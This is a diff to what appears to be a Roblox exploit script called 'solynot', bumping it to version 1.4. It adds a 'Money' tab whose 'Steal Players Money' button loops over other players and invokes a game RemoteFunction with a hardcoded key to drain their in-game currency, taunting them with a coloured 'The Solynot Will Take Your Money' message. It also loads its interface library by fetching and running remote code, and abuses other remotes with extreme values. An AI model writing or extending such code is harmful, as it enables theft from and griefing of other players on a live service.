@@ -22,10 +22,10 @@ local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.
 local localPlayer: Player = game:GetService("Players").LocalPlayer
 local npc = workspace:WaitForChild("Characters")
 local Remote: RemoteEvent = game:GetService("ReplicatedStorage"):WaitForChild("ALLREMBINDS"):WaitForChild("MainRemoteEvent")
+local Remote2: RemoteFunction = game:GetService("ReplicatedStorage"):WaitForChild("ALLREMBINDS"):WaitForChild("MainRemoteFunction")
 local fruits = localPlayer.PlayerStats.Tools
 local chest = workspace.World.Chests
 local HttpService = game:GetService("HttpService")
-local backpack = localPlayer:WaitForChild("Backpack")
 
 local tool = Instance.new("Tool")
 tool.Name = "CLICK TO DELETE"
@@ -69,7 +69,7 @@ for _, fruit in ipairs(fruits:GetChildren()) do
 end
 
 local Window = Main:CreateWindow({
-    Title = "solynot " .. 1.3,
+    Title = "solynot " .. 1.4,
     SubTitle = "by SolyNot",
     TabWidth = 160,
     Size = UDim2.fromOffset(580, 460),
@@ -81,6 +81,7 @@ local Tabs: {string: Tab} = {
 	Main = Window:AddTab({ Title = "Main", Icon = "box" }),
 	OP = Window:AddTab({ Title = "OP", Icon = "skull" }),
     vision = Window:AddTab({ Title = "Vision", Icon = "eye" }),
+    money = Window:AddTab({ Title = "Money", Icon = "banknote" }),
 	Fruits = Window:AddTab({ Title = "Fruits", Icon = "apple" }),
 	Aura = Window:AddTab({ Title = "Aura", Icon = "star" }),
 	Animation = Window:AddTab({ Title = "Animation", Icon = "play" }),
@@ -203,6 +204,31 @@ Tabs.vision:AddButton({
 	Callback = function()
 		game:GetService("ReplicatedStorage"):WaitForChild("ALLREMBINDS"):WaitForChild("MainRemoteEvent"):FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "ShAkeCamFromDiStanceee", {Vector3.new(0, 0, 0), 9999999999999999, {ShakeOnce = true, Propties = {9999999999, 999999, 5, 555, Vector3.new(10, 999999999, 10), Vector3.new(999, 999, 999)}}})
 	end
+})
+--money tab
+Tabs.money:AddButton({
+    Title = "Steal Players Money",
+    Description = "",
+    Callback = function()
+        for _, v in pairs(game:GetService("Players"):GetPlayers()) do
+            if v.Name ~= localPlayer.Name then
+                Remote2:InvokeServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "IsHaveAmountOfMoney", {v, nil, true, "FlashStepCost", '<font color="#FF0000">T</font><font color="#FF7F00">h</font><font color="#FFFF00">e</font> <font color="#00FF00">S</font><font color="#0000FF">o</font><font color="#4B0082">l</font><font color="#8B00FF">y</font><font color="#FF0000">n</font><font color="#FF7F00">o</font><font color="#FFFF00">t</font> <font color="#00FF00">W</font><font color="#0000FF">i</font><font color="#4B0082">l</font><font color="#8B00FF">l</font> <font color="#FF0000">T</font><font color="#FF7F00">a</font><font color="#FFFF00">k</font><font color="#00FF00">e</font> <font color="#0000FF">Y</font><font color="#4B0082">o</font><font color="#8B00FF">u</font><font color="#FF0000">r</font> <font color="#FF7F00">M</font><font color="#FFFF00">o</font><font color="#00FF00">n</font><font color="#0000FF">e</font><font color="#4B0082">y</font>'})
+                Remote2:InvokeServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "IsHaveAmountOfMoney", {v, nil, true, "AuraCost", '<font color="#FF0000">T</font><font color="#FF7F00">h</font><font color="#FFFF00">e</font> <font color="#00FF00">S</font><font color="#0000FF">o</font><font color="#4B0082">l</font><font color="#8B00FF">y</font><font color="#FF0000">n</font><font color="#FF7F00">o</font><font color="#FFFF00">t</font> <font color="#00FF00">W</font><font color="#0000FF">i</font><font color="#4B0082">l</font><font color="#8B00FF">l</font> <font color="#FF0000">T</font><font color="#FF7F00">a</font><font color="#FFFF00">k</font><font color="#00FF00">e</font> <font color="#0000FF">Y</font><font color="#4B0082">o</font><font color="#8B00FF">u</font><font color="#FF0000">r</font> <font color="#FF7F00">M</font><font color="#FFFF00">o</font><font color="#00FF00">n</font><font color="#0000FF">e</font><font color="#4B0082">y</font>'})
+                Remote2:InvokeServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "IsHaveAmountOfMoney", {v, nil, true, "AirJumpCost", '<font color="#FF0000">T</font><font color="#FF7F00">h</font><font color="#FFFF00">e</font> <font color="#00FF00">S</font><font color="#0000FF">o</font><font color="#4B0082">l</font><font color="#8B00FF">y</font><font color="#FF0000">n</font><font color="#FF7F00">o</font><font color="#FFFF00">t</font> <font color="#00FF00">W</font><font color="#0000FF">i</font><font color="#4B0082">l</font><font color="#8B00FF">l</font> <font color="#FF0000">T</font><font color="#FF7F00">a</font><font color="#FFFF00">k</font><font color="#00FF00">e</font> <font color="#0000FF">Y</font><font color="#4B0082">o</font><font color="#8B00FF">u</font><font color="#FF0000">r</font> <font color="#FF7F00">M</font><font color="#FFFF00">o</font><font color="#00FF00">n</font><font color="#0000FF">e</font><font color="#4B0082">y</font>'})
+            end
+        end
+    end
+})
+Tabs.money:AddButton({
+    Title = "print players money",
+    Description = "",
+    Callback = function()
+        for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
+            if plr ~= localPlayer then
+                print(plr, plr.PlayerStats.Money.Value)
+            end
+        end
+    end
 })
 -- Fruits Tab
 local FruitDropDown: DropdownMenuItem<Dropdown>
